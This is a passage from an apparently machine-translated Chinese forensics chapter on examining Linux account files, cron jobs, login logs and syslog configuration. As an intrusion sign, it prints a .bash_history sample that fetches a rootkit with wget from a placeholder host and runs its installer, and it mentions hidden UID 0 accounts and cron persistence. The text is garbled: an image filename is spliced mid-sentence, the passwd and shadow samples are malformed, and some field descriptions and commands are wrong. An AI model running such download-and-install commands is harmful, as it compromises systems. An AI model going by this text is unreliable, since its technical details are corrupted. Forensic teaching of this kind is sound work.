

## 第 7 章 + 文件分析

```
rpm:x:37:37:RPM user:/var/lib/rpm:/sbin/nologin
pulse:x:499:498:PulseAudio daemon:/sbin/nologin
polkit:x:87:87:PolicyKit:/sbin/nologin
avahi:x:495:495:avahi-daemon:/var/avahi-daemon:/sbin/nologin
hsqldbd:x:96:96:/var/lib/hsqldbd:/sbin/nologin
mailnull:x:47:47:/var/spool/mqueue:/sbin/nologin
smmsp:x:51:51:/var/spool/mqueue:/sbin/nologin
apache:x:48:48:Apache:/var/www:/sbin/nologin
tp:x:38:38:/etc/ntp:/sbin/nologin
hd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
rpcucser:x:29:29:RPC Service:/var/lib/nfs:/sbin/nologin
nfsnobody:x:65534:65534:Anonymous NFS:/var/lib/nfs:/sbin/nologin
torrent:x:497:493:BitTorrentSeed/Tracker:/var/spool/bittrent:/sbin/nologin
haldem:x:68:68:HAL daemon:/sbin/nologin
gdm:x:42:42:/var/gdm:/sbin/nologin
user:x:500:500:/home/user:/bin/bash
```

passwd 文件中的字段如下：

- 1. 用户名（已由 /etc/shadow 代替）
- 2. 哈希处理后的密码字段
- 3. 用户 ID (UID)
- 4. 主组 ID (GID) – 注意用户可以属于任意数量的组。此信息存储在 /etc/group 中
- 5. GECOS 注释字段 – 通常用于全名或为守护进程账户提供具描述性的名称
- 6. 用户家目录
- 7. 初始登录时运行的 Shell/程序

如你所见，即使在单用户系统上，该字段也相当密集。一种在现实环境中常见的旧技巧是在某些无人的守护进程账户中间添加一个额外的 UID 0 用户，且没人会注意。请注意，任何 UID 为 0的用户在功能上等同于 root。/etc/group 的格式类似，但字段较少：

```
root:x:0:root
bin:x:1:root,bin,daemon
daemon:x:2:root,bin,daemon
sys:x:3:root,bin,adm
adm:x:root,adm,daemon
tty:x:5:
disk:x:6:root
lp:x:7:daemon,lp
mem:x:8:
kmem:x:9:
wheel:x:10:root
```

第一个字段是组名，第二个是组密码的哈希值（通常不使用密码保护的组），第三个是 GID，第四个是组成员的逗号分隔列表。root 或 wheel 组中额外的未经授权用户是可疑的，值得进一步调查。

最后，我们有 /etc/shadow，它存储了加密的用户密码和相关信息。

```
root:$xGSGAI2:$jWMNlOc2Hft1BDveRqw3i::13977:99999:7::
bin::!13826:0:99999:7::
gdm::!13826:0:99999:7::
user::$xS1EcULjr2PGm7ia6kIdrTV::13978:999:7
```

再次，字段如下：

- 用户名
- 加密密码
- 自 epoch（1970年1月1日）以来更改密码的天数
- 密码更改之间的最小天数
- 密码有效期
- 距离过期前的警告天数
- 绝对过期日期
- 留作后用

你可能注意到“bin”和“gdm”守护进程账户没有加密密码。由于它们不是交互式的，空字段阻止了它们的登录。任何具有加密字段的用户账户都应该被调查（fd8e5097b3755dbc0dc22fd8cb1fe_181.png 文件分析

正如你所熟悉的，root 用户在标准 Linux 系统中拥有所有权限，获取该用户的访问对于调查至关重要。出于其他原因，对 root 的访问被严格控制。某些用户可能需要超出普通用户权限的任务。有几种方法可以管理这一点，我们稍后将讨论 setuid 二进制文件或 su 命令。su 命令要求用户在当前会话中以 root 身份登录。没有什么可以阻止用户未来直接以 root 身份登录。在共享环境中，root 应该刻意执行某些操作。这个问题通过 sudo 解决，它允许为非 root 用户授予 root 权限。对 sudoers 文件的完整分析是必要的。通过 /etc/security 文件检查是否存在异常或未经授权的条目。

### Cron 任务

"cron" 是 Linux 系统中在未来某个时间调度任务的主要方法。如你所见，这是确保对系统进行持续访问的好方法。cron 有两个主要位置：/var/spool/cron，它包含使用 "crontab" 命令进入的用户 ID；以及 /etc/crontab，它列出了系统级任务。这些任务位于 /etc/cron.hourly、/etc/cron.daily、/etc/cron.weekly 以及 /etc/crontab 中提到的其他目录。这是维护受攻击 UNIX 系统访问的一种旧但有效的方法。

### 日志文件

Linux 系统包含大量的日志文件，对调查可能很重要。在本节中，我涵盖涵盖每次调查中出现的关键问题的日志。

### Who

帮助确定参与事件的关键日志是“last”日志、utmp 和 wtmp。utmp 和 wtmp 是关联的。utmp 是一个记录当前登录系统的数据库。这些数据被转入 wtmp，记录登录的历史数据。通常在活动系统中通过“who”和“last”命令访问这些数据，但在事后分析期间，who 和 last 命令也用于读取 /var/run/utmp 和 /var/log/wtmp：

```
# tail -f /mnt/images/forensics/root/var/log/wtmp
user pts/2 :0:0 Apr 13 22:12 - 17:55 (19:43)
user pts/0 :0:0 Apr 13 16:54 - 17:55 (1+01:01)
reboot system 2.6.23.1-42.fc8 Sun Apr 13 16:50 (1+08:01)
user pts/1 :0:0 Apr 13 16:20 - 16:49 (00:29)
tty7 :0:0 Sun Apr 13 16:19 - 16:49 (00:30)
reboot system 2.6.23.1-42.fc8 Sun Apr 13 16:14 (00:35)
user pts/4 :0:0 Wed Apr 9 19:17 - 16:11 (3+20:53)
user pts/3 :0:0 Wed Apr 9 19:13 - 16:11 (3+20:57)
user pts/2 :0:0 Wed Apr 9 18:37 - 16:12 (3+21:34)
user pts/1 :0:0 Wed Apr 9 16:30 - 16:12 (3+24:42)
tty7 :0:0 Wed Apr 9 16:28 - 16:12 (3+23:44)
reboot system 2.6.23.1-42.fc8 Wed Apr 9 16:20 (3+53:52)
reboot system 2.6.23.1-42.fc8 Fri Nov 9 13:20 (00:01)
```

### 哪里和什么

入侵者去了哪里以及他们做了什么，这些问题通常需要比日志（例如取证）更多的回答。所以，如果用户的 .bash_history 包含以下内容：

```
w
cd /tmp
wget www.xxx.xxx.xxx/rootkit.tar.gz
tar xvzf rootkit.tar.gz
rm -rf rootkit.tar.gz
cd rootkit
./install
```

你就有很明显的迹象表明存在异常。从日志角度来看，关于系统上发生了什么的另一个主要信息来源是各种 syslog 日志。取决于你正在检查的系统环境，它完全可能记录到远程 syslog 服务器。检查 /etc/syslog.conf 查看哪些日志设施被定向到文件或主机；远程日志会在主机名前有一个 @ 符号。这里有一个总结性的示例：

```
*.info;none;authpriv.none;cron.none /var/log/messages
authpriv.* /var/log/secure
mail.* @mail.server.localdomain
cron.* /var/log/cron
```



在这种情况下，如果你的调查依赖于邮件日志，你将从 mail.server.localdomain 获取它们。它们不会出现在本地机器上。

### 感兴趣的其他文件

现在我们已经确定了大多数调查中可能需要的关键文件，我们将提供一些技术来寻找那些其他文件，即构成你分析材料的大部分文件。这些文件每次可能都不同，因此遗憾我们无法提供一个列表并让你每次都获取以下内容。

### SUID 和 SGID Root 文件

在章节的前面，我们注意到确定谁拥有 root 账户访问权限或 root 级权限的重要性。另一种执行命令的方法是
